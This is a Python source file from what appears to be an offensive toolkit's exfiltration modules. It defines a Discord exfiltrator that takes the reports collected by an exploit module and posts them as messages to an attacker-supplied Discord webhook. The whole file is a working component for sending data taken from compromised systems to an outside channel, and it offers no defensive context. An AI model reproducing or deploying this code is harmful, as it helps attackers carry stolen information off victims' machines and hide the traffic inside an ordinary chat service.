import asyncio
import aiohttp
from discord import Webhook, AsyncWebhookAdapter

from src.modules.exfiltration.base import Exfiltrator, Exploit


class Discord(Exfiltrator):
    def __init__(self, *,
                 module: Exploit,
                 tag: str = None,
                 webhook_url: str):
        super().__init__(module, tag)
        self.webhook_url = webhook_url

    def update(self) -> None:
        """Send each report as a new message to a Discord server with a
        Webhook URL enabled."""
        if self.module.has_data is True:
            asyncio.run(self.send_message())

    async def send_message(self) -> None:
        async with aiohttp.ClientSession() as session:
            webhook = Webhook.from_url(url=self.webhook_url,
                                       adapter=AsyncWebhookAdapter(session))
            await webhook.send(content=self.report,
                               username=self.module.__class__.__name__)
